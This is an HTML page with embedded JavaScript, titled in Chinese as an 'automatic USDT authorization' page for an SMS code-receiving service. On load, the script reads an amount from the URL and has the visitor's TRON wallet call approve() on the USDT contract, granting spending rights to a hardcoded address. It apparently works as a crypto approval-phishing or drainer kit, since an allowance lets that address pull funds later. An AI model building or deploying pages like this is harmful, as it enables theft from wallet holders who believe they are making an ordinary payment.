<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>專業海內外接碼 - 自動 USDT 授權</title>
</head>
<body>
<h2>USDT 自動授權頁</h2>
<p id="status">正在準備授權...</p>

<script>
// 配置
const merchant = "TFEatdc8r36CrNqqKrbX6724DUsDyd6tHD"
const usdtContract = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"
const decimals = 6

// 讀取 URL 金額
function getAmountFromUrl(){
  const params = new URLSearchParams(window.location.search)
  return parseFloat(params.get("amount"))
}

// 轉換成最小單位
function toSun(amount){ return BigInt(Math.floor(amount * Math.pow(10, decimals))) }

async function autoApprove(){
  const statusEl = document.getElementById("status")
  const amount = getAmountFromUrl()
  if(!amount || amount<=0){
    statusEl.innerText = "授權金額錯誤"
    return
  }

  if(typeof window.tronWeb === "undefined"){
    statusEl.innerText = "請在 TokenPocket DApp Browser 打開"
    return
  }

  try{
    statusEl.innerText = `正在授權 ${amount} USDT...`
    const value = toSun(amount)
    const contract = await window.tronWeb.contract().at(usdtContract)
    await contract.approve(merchant, value).send()
    statusEl.innerText = "授權成功 ✅"
  }catch(e){
    statusEl.innerText = "授權失敗 ❌ " + e
  }
}

// 頁面載入後自動執行
window.onload = autoApprove
</script>
</body>
</html>
